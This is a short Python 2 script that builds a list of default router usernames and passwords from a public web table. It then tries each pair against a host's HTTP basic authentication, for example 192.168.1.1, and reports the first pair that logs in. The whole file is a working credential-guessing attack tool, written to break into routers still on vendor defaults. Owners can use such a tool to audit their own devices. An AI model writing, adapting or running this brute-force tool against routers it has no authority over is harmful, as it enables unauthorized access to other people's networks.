#!/usr/bin/python
"""
Try commonly used pairs user/password to access an ADSL router. The 
password list is created from this URL:

http://www.phenoelit-us.org/dpl/dpl.html

Author: tokland@gmail.com

Example:

1. Generate TXT password file from HTML:

wget http://www.phenoelit-us.org/dpl/dpl.html
python dpl.py --generate

2. Try user/password list for host 192.168.1.1:

python dpl.py 192.168.1.1
"""
import sys
import urllib2
import optparse
import BeautifulSoup

def debug(lineinfo):
    """Write a line to standard error"""
    sys.stderr.write("--- " + lineinfo + "\n")
    sys.stderr.flush()
    
def get_soup(data):
    """Return a soup of HTML tags from string data"""
    return BeautifulSoup.BeautifulSoup(data)

def get_contents(tags):
    """Iterate on tags and extract string contents"""
    for tag in tags:
        if tag.contents:
            yield str(tag.contents[0]).strip()
        else: yield ""
        
def get_info(filename):
    """Yield user/password pairs from dpl htmt list"""
    skip = set(["", "n/a"])
    soup = get_soup(open(filename).read())    
    trtags = soup.findAll("tr")
    headers = list(get_contents(trtags[0].findAll("td")))
    useridx = headers.index("User ID")
    passwordidx = headers.index("Password")
    seen = set()
    for trtag in trtags[1:]:
        tds = list(get_contents(trtag.findAll("td")))
        user, password = (tds[useridx], tds[passwordidx])
        entry = user, password
        if entry in seen:
            continue
        if user in skip or password in skip:
            continue
        if user.startswith("(") or password.startswith("("):
            continue
        if " " in user or " " in password:
            continue
        yield entry
        seen.add(entry)        

def create_password_file(htmlfile):
    """Create a file of user/password pairs from dpl html list"""
    output = ("%s %s\n" % (u, p) for (u, p) in get_info(htmlfile))
    sys.stdout.writelines(sorted(output))

def try_user(hosturl, username, password):
    """Return True if hosturl can be accessed using a username/password"""  
    password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_mgr.add_password(None, hosturl, username, password)
    handler = urllib2.HTTPBasicAuthHandler(password_mgr)
    opener = urllib2.build_opener(handler)
    debug("trying: %s/%s" % (username, password))
    try:
        opener.open(hosturl).read()
    except urllib2.HTTPError:
        return False
    return True

def connect(host, passfilename):    
    """Try all pairs user/password to access a given host with HTTP
    authentication enabled"""
    if not host.startswith("http://"):
        host = "http://" + host    
    user_passwords = [line.split() for line in open(passfilename)]
    for username, password in user_passwords:
        if try_user(host, username, password):
            print "found: %s/%s" % (username, password)
            break
    
def main(args):
    usage = """usage: myprogram [options] [host]

    %s""" % __doc__ 
    parser = optparse.OptionParser(usage)
    parser.add_option('-v', '--verbose', dest='vlevel', action="count",
        default=0, help='Increase verbose level (0=Error, 1=Info, 2=Debug)')
    parser.add_option('-g', '--generate-password-file', dest='generate',
        action="store_true", default=False, help='Generate password file')
    options, args0 = parser.parse_args(args)
    if options.generate:
        output = ("%s %s\n" % (u, p) for (u, p) in get_info("dpl.html"))
        open("dpl.txt", "w").writelines(sorted(output))
        return 0
    if len(args0) == 0:
        parser.print_help()
        return 1
    connect(args0[0], "dpl.txt")    
        
if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
